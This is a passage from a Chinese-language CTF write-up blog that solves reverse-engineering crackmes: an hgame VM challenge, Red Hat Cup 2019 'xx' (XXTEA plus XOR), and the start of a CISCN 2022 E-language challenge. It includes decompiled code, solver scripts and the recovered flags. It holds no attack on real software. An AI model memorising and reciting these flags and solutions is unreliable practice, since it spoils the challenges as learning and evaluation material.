mov reg0 input[reg2]</span><br><span class="line"><span class="number">12</span>    mov reg1 reg0</span><br><span class="line"><span class="comment">// reg1 = input[i]</span></span><br><span class="line"><span class="number">16</span>    mov reg2 <span class="number">50</span></span><br><span class="line"><span class="number">20</span>    add reg2 reg3</span><br><span class="line"><span class="comment">// reg2 = 50+i</span></span><br><span class="line"><span class="number">24</span>    mov reg0 input[reg2]</span><br><span class="line"><span class="number">28</span>    add reg1 reg0</span><br><span class="line"><span class="comment">// reg1 += input[50+i]</span></span><br><span class="line"><span class="number">32</span>    mov reg2 <span class="number">100</span></span><br><span class="line"><span class="number">36</span>    add reg2 reg3</span><br><span class="line"><span class="number">40</span>    mov reg0 input[reg2]</span><br><span class="line"><span class="comment">// reg0 = input[100+i]</span></span><br><span class="line"><span class="number">44</span>    <span class="keyword">xor</span> reg1 reg0</span><br><span class="line"><span class="comment">// reg1 ^= reg0</span></span><br><span class="line"><span class="comment">// reg1 = (input[i]+input[50+i])^input[100+i]</span></span><br><span class="line"><span class="comment">// 注意到原本的Input不止40个数据 所以只有前40个是被输入覆盖 后面还是有数据的</span></span><br><span class="line"><span class="number">48</span>    mov reg0 <span class="number">8</span></span><br><span class="line"><span class="number">52</span>    mov reg2 reg1</span><br><span class="line"><span class="number">56</span>    shl reg1 reg0</span><br><span class="line">      <span class="keyword">and</span> reg1 <span class="number">0xFF00</span>u</span><br><span class="line"><span class="number">60</span>    shr reg2 reg0</span><br><span class="line"><span class="number">64</span>    add reg1 reg2</span><br><span class="line"><span class="number">68</span>    mov reg0 reg1</span><br><span class="line"><span class="number">72</span>    push reg0</span><br><span class="line"><span class="comment">// reg0 = (reg1&lt;&lt;8)&amp;0xFF00 + reg1&gt;&gt;8</span></span><br><span class="line"><span class="comment">// 其实就是reg1的高低位互换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里是一个ecx的check 相当于reg0++ 然后cmp reg0 40 达到循环次数就跳出</span></span><br><span class="line"><span class="comment">// reg0++;reg3++;cmp reg0 40;</span></span><br><span class="line"><span class="number">74</span>    mov reg0 <span class="number">1</span></span><br><span class="line"><span class="number">78</span>    add reg3 reg0</span><br><span class="line"><span class="number">82</span>    mov reg0 reg3</span><br><span class="line"><span class="number">86</span>    mov reg1 <span class="number">40</span></span><br><span class="line"><span class="number">90</span>    cmp reg0 reg1</span><br><span class="line"><span class="number">91</span>    je <span class="number">95</span></span><br><span class="line"><span class="number">93</span>    jmp <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环check</span></span><br><span class="line"><span class="number">95</span>    mov reg3 <span class="number">0</span></span><br><span class="line"><span class="comment">// loop:99~133</span></span><br><span class="line"><span class="comment">//这段check是将上面运算保存在tmp栈中的数据取出来与input[]做比较check</span></span><br><span class="line"><span class="comment">// tmp[]数组是逆序取 Input[]是正序取</span></span><br><span class="line"><span class="number">99</span>    pop reg1</span><br><span class="line"><span class="number">101</span>   mov reg2 <span class="number">150</span></span><br><span class="line"><span class="number">105</span>   add reg2 reg3</span><br><span class="line"><span class="number">109</span>   mov reg0 input[reg2]</span><br><span class="line"><span class="number">113</span>   cmp reg0 reg1</span><br><span class="line"><span class="comment">// reg0 = input[150+i]</span></span><br><span class="line"><span class="number">114</span>   jne <span class="number">136</span>   <span class="comment">// Fail</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// reg3++;reg0++;cmp reg0 40;</span></span><br><span class="line"></span><br><span class="line"><span class="number">116</span>   mov reg0 <span class="number">1</span></span><br><span class="line"><span class="number">120</span>   add reg3 reg0</span><br><span class="line"><span class="number">124</span>   mov reg0 reg3</span><br><span class="line"><span class="number">128</span>   mov reg1 <span class="number">40</span></span><br><span class="line"><span class="number">132</span>   cmp reg0 reg1</span><br><span class="line"><span class="number">133</span>   jne <span class="number">99</span></span><br></pre></td></tr></table></figure><p>注意到初始的input数组有200个 前40用来getchar 后面的用来check和进行运算<br>所以提取出[-50:-10] 逆序后逆回去即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x0000009B</span>, <span class="number">0x000000A8</span>, <span class="number">0x00000002</span>, <span class="number">0x000000BC</span>, <span class="number">0x000000AC</span>, <span class="number">0x0000009C</span>, <span class="number">0x000000CE</span>, <span class="number">0x000000FA</span>, <span class="number">0x00000002</span>, <span class="number">0x000000B9</span>, <span class="number">0x000000FF</span>, <span class="number">0x0000003A</span>, <span class="number">0x00000074</span>, <span class="number">0x00000048</span>, <span class="number">0x00000019</span>, <span class="number">0x00000069</span>, <span class="number">0x000000E8</span>, <span class="number">0x00000003</span>, <span class="number">0x000000CB</span>, <span class="number">0x000000C9</span>, <span class="number">0x000000FF</span>, <span class="number">0x000000FC</span>, <span class="number">0x00000080</span>, <span class="number">0x000000D6</span>, <span class="number">0x0000008D</span>, <span class="number">0x000000D7</span>, <span class="number">0x00000072</span>, <span class="number">0x00000000</span>, <span class="number">0x000000A7</span>, <span class="number">0x0000001D</span>, <span class="number">0x0000003D</span>, <span class="number">0x00000099</span>, <span class="number">0x00000088</span>, <span class="number">0x00000099</span>, <span class="number">0x000000BF</span>, <span class="number">0x000000E8</span>, <span class="number">0x00000096</span>, <span class="number">0x0000002E</span>, <span class="number">0x0000005D</span>, <span class="number">0x00000057</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x000000C9</span>, <span class="number">0x000000A9</span>, <span class="number">0x000000BD</span>, <span class="number">0x0000008B</span>, <span class="number">0x00000017</span>, <span class="number">0x000000C2</span>, <span class="number">0x0000006E</span>, <span class="number">0x000000F8</span>, <span class="number">0x000000F5</span>, <span class="number">0x0000006E</span>, <span class="number">0x00000063</span>, <span class="number">0x00000063</span>, <span class="number">0x000000D5</span>, <span class="number">0x00000046</span>, <span class="number">0x0000005D</span>, <span class="number">0x00000016</span>, <span class="number">0x00000098</span>, <span class="number">0x00000038</span>, <span class="number">0x00000030</span>, <span class="number">0x00000073</span>, <span class="number">0x00000038</span>, <span class="number">0x000000C1</span>, <span class="number">0x0000005E</span>, <span class="number">0x000000ED</span>, <span class="number">0x000000B0</span>, <span class="number">0x00000029</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000018</span>, <span class="number">0x00000040</span>, <span class="number">0x000000A7</span>, <span class="number">0x000000FD</span>, <span class="number">0x0000000A</span>, <span class="number">0x0000001E</span>, <span class="number">0x00000078</span>, <span class="number">0x0000008B</span>, <span class="number">0x00000062</span>, <span class="number">0x000000DB</span>, <span class="number">0x0000000F</span>, <span class="number">0x0000008F</span>, <span class="number">0x0000009C</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00004800</span>, <span class="number">0x0000F100</span>, <span class="number">0x00004000</span>, <span class="number">0x00002100</span>, <span class="number">0x00003501</span>, <span class="number">0x00006400</span>, <span class="number">0x00007801</span>, <span class="number">0x0000F900</span>, <span class="number">0x00001801</span>, <span class="number">0x00005200</span>, <span class="number">0x00002500</span>, <span class="number">0x00005D01</span>, <span class="number">0x00004700</span>, <span class="number">0x0000FD00</span>, <span class="number">0x00006901</span>, <span class="number">0x00005C00</span>, <span class="number">0x0000AF01</span>, <span class="number">0x0000B200</span>, <span class="number">0x0000EC01</span>, <span class="number">0x00005201</span>, <span class="number">0x00004F01</span>, <span class="number">0x00001A01</span>, <span class="number">0x00005000</span>, <span class="number">0x00008501</span>, <span class="number">0x0000CD00</span>, <span class="number">0x00002300</span>, <span class="number">0x0000F800</span>, <span class="number">0x00000C00</span>, <span class="number">0x0000CF00</span>, <span class="number">0x00003D01</span>, <span class="number">0x00004501</span>, <span class="number">0x00008200</span>, <span class="number">0x0000D201</span>, <span class="number">0x00002901</span>, <span class="number">0x0000D501</span>, <span class="number">0x00000601</span>, <span class="number">0x0000A201</span>, <span class="number">0x0000DE00</span>, <span class="number">0x0000A601</span>, <span class="number">0x0000CA01</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>]</span><br><span class="line">tmp = enc[-<span class="number">50</span>:-<span class="number">10</span>]</span><br><span class="line">tmp = tmp[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    x = ((tmp[i]&lt;&lt;<span class="number">8</span>)&amp;<span class="number">0xFF00</span>)+(tmp[i]&gt;&gt;<span class="number">8</span>)</span><br><span class="line">    x ^= enc[<span class="number">100</span>+i]</span><br><span class="line">    x -= enc[<span class="number">50</span>+i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;y0ur_rever5e_sk1ll_i5_very_g0od!!&#125;</span></span><br></pre></td></tr></table></figure><p><strong>hgame{y0ur_rever5e_sk1ll_i5_very_g0od!!}</strong></p><hr><hr><p>总结: 重点在于jmp&#x2F;jne&#x2F;je时我们的pc是要继续跟着+2的 而不是直接跳转到opcode[pc+1]的地址<br>准确来说应该不能命名为pc 看成eip更妥当<br>pc是指令地址 在opcode执行时是跟着跳转的  eip储存的是当前语句的位置 是顺序走的<br>所以应该把打印opcode的pc全部换成eip才符合原理</p><p>然后就是手撕汇编的时候要注意到初始数组的多重功能</p><p>vm+opcode确实很好玩(也很累…) 做这种可以很好地<del>复习计组</del>理解原理&#x2F;提升逆向基本功&#x2F;<del>锻炼耐心</del></p><h1 id="红帽杯2019"><a href="#红帽杯2019" class="headerlink" title="红帽杯2019"></a>红帽杯2019</h1><h2 id="xx"><a href="#xx" class="headerlink" title="xx"></a>xx</h2><p>几个月前做第一段都没看懂 那段循环增加的xor也没看懂<br>现在再来看就好多了</p><p>IDA打开<br>开始有一个len&#x3D;19的check<br>后面有个奇怪的Code:qwertyuiopasdfghjklzxcvbnm1234567890<br>然而逆向时并没有发现有啥用…<br>关键点:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line"> &#123;</span><br><span class="line">   v10 = *((_BYTE *)v9 + (<span class="type">char</span> *)INPUT - (<span class="type">char</span> *)v5);</span><br><span class="line">   v11 = <span class="number">0</span>;</span><br><span class="line">   *(_BYTE *)v9 = v10;</span><br><span class="line">   v12 = <span class="number">0</span>i64;</span><br><span class="line">   v13 = <span class="number">-1</span>i64;</span><br><span class="line">   <span class="keyword">do</span></span><br><span class="line">     ++v13;</span><br><span class="line">   <span class="keyword">while</span> ( *(_BYTE *)(v6 + v13) );</span><br><span class="line">   <span class="keyword">if</span> ( v13 )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">do</span></span><br><span class="line">     &#123;</span><br><span class="line">       <span class="keyword">if</span> ( v10 == *(_BYTE *)(v6 + v12) )      <span class="comment">// find index???</span></span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       ++v11;</span><br><span class="line">       ++v12;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">while</span> ( v11 &lt; v13 );</span><br><span class="line">   &#125;</span><br><span class="line">   v14 = <span class="number">-1</span>i64;</span><br><span class="line">   <span class="keyword">do</span></span><br><span class="line">     ++v14;</span><br><span class="line">   <span class="keyword">while</span> ( *(_BYTE *)(v6 + v14) );</span><br><span class="line">   <span class="keyword">if</span> ( v11 == v14 )</span><br><span class="line">     _exit(v6);</span><br><span class="line">   v9 = (__int128 *)((<span class="type">char</span> *)v9 + <span class="number">1</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">while</span> ( (<span class="type">char</span> *)v9 - (<span class="type">char</span> *)v5 &lt; <span class="number">4</span> );        <span class="comment">// &lt;4 ==&gt; 取前4位作为xxtea的key</span></span><br></pre></td></tr></table></figure><p>这里结合动调可以知道后面xxtea的key就是取的input的前4位<br>xxtea</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v17 = <span class="built_in">XXTEA</span>((__int64)INPUT, v3, (<span class="type">unsigned</span> __int8 *)&amp;KEY, &amp;Size);<span class="comment">// KEY: INPUT的前四个字母 盲猜flag?</span></span><br></pre></td></tr></table></figure><p>这里就猜flag吧<br>再后面有个对xxtea加密的input数组的换序<br>换序完了就是一段两个月前没看明白的xor</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( v20[<span class="number">23</span>] = enc_input1[<span class="number">21</span>]; v21 &lt; v18; ++v22 )</span><br><span class="line">  &#123;</span><br><span class="line">    v23 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( v21 / <span class="number">3</span> &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v24 = *v22;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v24 ^= v20[v23++];</span><br><span class="line">        *v22 = v24;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v23 &lt; v21 / <span class="number">3</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    ++v21;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这个逆向就这么写:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//decrypt</span></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> v21:1-&gt;23</span></span><br><span class="line"><span class="comment"> 从v21=3开始</span></span><br><span class="line"><span class="comment"> v23:0-&gt;(v21//3)-1</span></span><br><span class="line"><span class="comment">     v20[v22] ^= v20[v23]</span></span><br><span class="line"><span class="comment"> v21==v22 同步</span></span><br><span class="line"><span class="comment"> 前面先改变会影响后面xor的值 所以倒序逆向</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">23</span>;i++)&#123;</span><br><span class="line">     <span class="type">int</span> v23 = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">if</span>(i/<span class="number">3</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;(i/<span class="number">3</span>);j++)&#123;</span><br><span class="line">             enc[i] ^= enc[j];</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这步逆回去后换个序得到:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">206</span>,<span class="number">188</span>,<span class="number">64</span>,<span class="number">165</span>,<span class="number">178</span>,<span class="number">244</span>,<span class="number">231</span>,<span class="number">178</span>,<span class="number">157</span>,<span class="number">169</span>,<span class="number">18</span>,<span class="number">18</span>,<span class="number">200</span>,<span class="number">174</span>,<span class="number">91</span>,<span class="number">16</span>,<span class="number">6</span>,<span class="number">61</span>,<span class="number">29</span>,<span class="number">215</span>,<span class="number">248</span>,<span class="number">220</span>,<span class="number">220</span>,<span class="number">112</span>]</span><br></pre></td></tr></table></figure><p>然后小端序取一下:<br>得到:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x40cea5bc</span>,<span class="number">0xe7b2b2f4</span>,<span class="number">0x129d12a9</span>,<span class="number">0x5bc810ae</span>,<span class="number">0x1d6d73d</span>,<span class="number">0xdcf870dc</span></span><br></pre></td></tr></table></figure><p>这里python莫名其妙的坑了我半天… 以后数组赋初值的时候赋[0]*xxx 最好别直接 enc2&#x3D;enc …<br>莫名其妙调试了好久<br>然后key是flag<br>这里不是很清楚是小端序拆成字节还是其他组合 动调跟进xxtea<br>发现开头做了一系列字节拼接操作<br>又注意到在主加密部分<br>v18[]的类型是DWORD 所以key数组(一个小坑):</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">0x67616c66</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure><p>解xxtea 稍稍改下位移常数<br>最后解出flag<br><strong>flag{CXX_and_++tea}</strong></p><hr><hr><p>其实从这里也看得出来key:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = v15 + <span class="number">1</span>; i &lt; <span class="number">0x10</span>; ++i )</span><br><span class="line">  *((_BYTE *)&amp;KEY + i) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>做的时候还有一个比较疑惑的点<br>输入的是19个字符 但是最后加密却是6组DWORD<br>xxtea解密发现是将0 19 0 0 0 接在后面一起加密的<br>也就是将SIZE也作为了加密的一部分?<br>那么是在程序的哪个地方实现的呢？<br>以后有空&#x2F;感兴趣时再来看吧 火车上不是很想逆了(头晕…)</p><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>代码分析太长了…<br><a href="https://www.cnblogs.com/U-L-G-A-N-O-Y/articles/-/NOZOMIZO">here~</a></p><h1 id="CISCN-2022-东北"><a href="#CISCN-2022-东北" class="headerlink" title="CISCN 2022 东北"></a>CISCN 2022 东北</h1><h2 id="hana"><a href="#hana" class="headerlink" title="hana"></a>hana</h2><p>易语言…<br>在NCTF2023初次接触易语言的题目 完全不会… 这p语言写的是真抽象<br>在了解了一点点易语言的逆向知识后 再来看看这道</p><p>这题甚至还是在mfc上加上易语言 真的难看啊…<br>main</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">sub_476208</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">CWinThread</span> *Thread; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">-1</span>;</span><br><span class="line">  Thread = <span class="built_in">AfxGetThread</span>();</span><br><span class="line">  v6 = *((_DWORD *)<span class="built_in">AfxGetModuleState</span>() + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_47A455</span>(a1, a2, a3, a4) &amp;&amp; (!v6 || (*(<span class="built_in">int</span> (__thiscall **)(<span class="type">int</span>))(*(_DWORD *)v6 + <span class="number">132</span>))(v6)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (*(<span class="built_in">int</span> (__thiscall **)(<span class="keyword">struct</span> CWinThread *))(*(_DWORD *)Thread + <span class="number">80</span>))(Thread) )<span class="comment">// INPUT AND CHECK</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = (*(<span class="built_in">int</span> (__thiscall **)(<span class="keyword">struct</span> CWinThread *))(*(_DWORD *)Thread + <span class="number">84</span>))(Thread);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *((_DWORD *)Thread + <span class="number">7</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">        (*(<span class="built_in">void</span> (__thiscall **)(<span class="type">int</span>))(*(_DWORD *)v7 + <span class="number">88</span>))(v7);</span><br><span class="line">      v8 = (*(<span class="built_in">int</span> (__thiscall **)(<span class="keyword">struct</span> CWinThread *))(*(_DWORD *)Thread + <span class="number">104</span>))(Thread);</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">AfxWinTerm</span>();</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动调可以找到输入和check点<br>找到这个函数(需要p一下 开始IDA没有识别)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_4010B0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  lpMem = (<span class="type">void</span> *)((<span class="type">void</span> *(*)(<span class="type">int</span>, ...))sub_401446)(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  v0 = lpMem;</span><br><span class="line">  <span class="keyword">if</span> ( !lpMem )</span><br><span class="line">    v0 = &amp;unk_48049C;</span><br><span class="line">  <span class="keyword">if</span> ( ((_DWORD (*)(<span class="type">int</span>, ...))sub_401446)(<span class="number">1</span>, v0, <span class="number">0</span>, <span class="number">0x80000004</span>) == <span class="number">38</span> )<span class="comment">// len=38?</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = lpMem;</span><br><span class="line">    <span class="keyword">if</span> ( !lpMem )</span><br><span class="line">      v1 = &amp;unk_48049C;</span><br><span class="line">    v12 = (<span class="type">void</span> *)((<span class="type">void</span> *(*)(<span class="type">int</span>, ...))sub_401446)(<span class="number">1</span>, v1, <span class="number">0</span>, <span class="number">0x80000004</span>);</span><br><span class="line">    v2 = (<span class="type">void</span> *)((<span class="type">void</span> *(*)(<span class="type">int</span>, ...))sub_40144C)(<span class="number">1</span>, &amp;unk_48049D, <span class="number">0</span>, <span class="number">0x80000005</span>);</span><br><span class="line">    v10 = v2;</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">      v2 = &amp;unk_4804BB;</span><br><span class="line">    v9 = (<span class="type">void</span> *)((<span class="type">void</span> *(*)(<span class="type">int</span>, ...))sub_401446)(<span class="number">1</span>, v2, <span class="number">0</span>, <span class="number">0x80000005</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">      <span class="built_in">sub_401440</span>(v10);</span><br><span class="line">    v3 = v9;</span><br><span class="line">    <span class="keyword">if</span> ( !v9 )</span><br><span class="line">      v3 = &amp;unk_48049C;</span><br><span class="line">    v8 = v3;</span><br><span class="line">    v4 = v12;</span><br><span class="line">    <span class="keyword">if</span> ( !v12 )</span><br><span class="line">      v4 = &amp;unk_4804BB;</span><br><span class="line">    ((<span class="built_in">void</span> (*)(<span class="type">int</span>, ...))sub_40144C)(<span class="number">3</span>, v4, <span class="number">0</span>, <span class="number">0x80000005</span>, v8, <span class="number">0</span>, <span class="number">0x80000004</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0x80000301</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">      <span class="built_in">sub_401440</span>(v12);</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">      <span class="built_in">sub_401440</span>(v9);</span><br><span class="line">    <span class="built_in">JUMPOUT</span>(<span class="number">0x40122D</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = (<span class="type">void</span> *)((<span class="type">void</span> *(*)(<span class="type">int</span>, ...))sub_40144C)(<span class="number">1</span>, &amp;unk_48049D, <span class="number">0</span>, <span class="number">0x80000005</span>);</span><br><span class="line">  v5 = v13;</span><br><span class="line">  <span class="keyword">if</span> ( !v13 )</span><br><span class="line">    v5 = &amp;unk_4804BB;</span><br><span class="line">  v11 = (<span class="type">void</span> *)((<span class="type">void</span> *(*)(<span class="type">int</span>, ...))sub_401446)(<span class="number">1</span>, v5, <span class="number">0</span>, <span class="number">0x80000005</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v13 )</span><br><span class="line">    <span class="built_in">sub_401440</span>(v13);</span><br><span class="line">  v6 = v11;</span><br><span class="line">  <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    v6 = &amp;unk_48049C;</span><br><span class="line">  